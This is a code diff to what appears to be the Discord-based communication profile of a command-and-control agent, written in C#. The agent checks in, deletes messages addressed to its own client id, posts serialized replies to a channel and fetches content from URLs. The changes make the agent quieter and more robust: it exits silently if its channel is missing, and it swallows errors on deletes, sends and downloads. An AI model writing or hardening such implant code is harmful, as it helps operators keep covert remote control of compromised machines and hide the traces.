@@ -58,6 +58,12 @@ namespace Agent.Profiles
 
         private async Task _client_Ready()
         {
+            _channel = (ITextChannel)_client.GetChannel(_channel_id);
+
+            if(_channel is null)
+            {
+                Environment.Exit(0);
+            }
             clientReady.Set();
         }
 
@@ -75,7 +81,12 @@ namespace Agent.Profiles
 
             if (discordMessage is not null &! discordMessage.to_server && discordMessage.client_id == _uuid) //It belongs to us
             {
-                _ = message.DeleteAsync();
+                try
+                {
+                    _ = message.DeleteAsync();
+                }
+                catch { }
+                
 
                 if (!checkedin)
                 {
@@ -163,18 +174,29 @@ namespace Agent.Profiles
                 client_id = "",
             };
 
-            ITextChannel channel = (ITextChannel)_client.GetChannel(_channel_id);
+            if(_channel is null)
+            {
+                _channel = (ITextChannel)_client.GetChannel(_channel_id);
+            }
 
             if (json.Length > 1950)
             {
                 using (MemoryStream stream = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(discordMessage))))
                 {
-                    await channel.SendFileAsync(stream, discordMessage.client_id + ".server");
+                    try
+                    {
+                        await _channel.SendFileAsync(stream, discordMessage.client_id + ".server");
+                    }
+                    catch { }
                 }
             }
             else
             {
-                await channel.SendMessageAsync(System.Text.Json.JsonSerializer.Serialize(discordMessage));
+                try
+                {
+                    await _channel.SendMessageAsync(System.Text.Json.JsonSerializer.Serialize(discordMessage));
+                }
+                catch { }
             }
 
             return String.Empty;
@@ -187,14 +209,18 @@ namespace Agent.Profiles
         }
         private async Task<string> GetFileContentsAsync(string url)
         {
-            string message;
-            using (HttpResponseMessage response = await _httpClient.GetAsync(url))
+            string message = String.Empty;
+            try
             {
-                using (HttpContent content = response.Content)
+                using (HttpResponseMessage response = await _httpClient.GetAsync(url))
                 {
-                    message = await content.ReadAsStringAsync();
+                    using (HttpContent content = response.Content)
+                    {
+                        message = await content.ReadAsStringAsync();
+                    }
                 }
             }
+            catch { }
             return await Unescape(message) ?? "";
         }
         private async Task<string> Unescape(string message)
